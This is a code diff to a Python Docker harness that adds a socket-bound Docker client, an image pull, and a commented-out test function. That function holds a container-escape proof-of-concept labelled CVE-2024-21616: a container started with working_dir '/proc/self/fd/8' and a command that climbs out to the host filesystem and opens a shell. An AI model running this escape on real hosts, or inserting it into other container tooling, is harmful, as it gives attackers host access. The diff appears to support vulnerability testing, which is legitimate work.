@@ -4,7 +4,10 @@ from config import *
 import docker
 from signal import SIGKILL
 container = None
-
+# Create a Docker API client
+print("Starting Script")
+client = docker.APIClient(base_url='unix://var/run/docker.sock')
+print("Client Connected")
 def is_service_running(service_name):
     try:
         subprocess.run(['systemctl', 'is-active', service_name], check=True, stdout=subprocess.PIPE)
@@ -25,6 +28,8 @@ def get_version():
 def parse_trick_and_run(config_data):
     # Create a Docker client
     client = docker.from_env()
+    # Pull the 'ubuntu' image
+    client.images.pull('ubuntu')
     results = {}
 
     for step in config_data['steps']:
@@ -67,3 +72,56 @@ def parse_trick_and_run(config_data):
                     container.remove(force=True) 
 
     return results
+
+
+
+# def test():
+#     print("Starting test function")
+    
+
+#     # Pull the 'ubuntu' image
+#     client.pull('ubuntu', None, stream=True)
+#     # Pull the 'ubuntu' image
+#     print("Ubuntu image pulled")
+
+
+#     print("Docker client created")
+#     results = {}
+
+#     try:
+#         existing_container = client.containers.get("CVE-2024-21616")
+#         print("Container CVE-2024-21616 already exists. Removing it.")
+#         if existing_container.status == 'running':
+#             existing_container.kill(signal=SIGKILL)
+#         existing_container.remove(force=True)
+#     except docker.errors.NotFound:
+#         print("No existing container named CVE-2024-21616 found. Proceeding to create a new one.")
+
+#     try:
+#         global container
+#         container = client.containers.run(
+#             image="ubuntu",
+#             name="CVE-2024-21616",
+#             command='/bin/bash -c "cd ../../../../ && exec /bin/bash"',
+#             working_dir='/proc/self/fd/8',
+#             detach=True,
+#             tty=True
+#         )
+#         print("CONTAINER STARTED")
+#         results['status'] = 'success'
+#         results['name'] = "CVE-2024-21616"
+#         # container.wait(timeout=5)  # Wait for the container to finish
+#         # container.remove()  # Remove the container
+#     except Exception as e:
+#         results['status'] = 'failure'
+#         results['error'] = str(e)
+#     finally:
+#         if container is not None:
+#             container.kill(signal=SIGKILL)
+#             container.remove(force=True) 
+
+#     print("Returning results")
+#     return results
+
+
+# test()
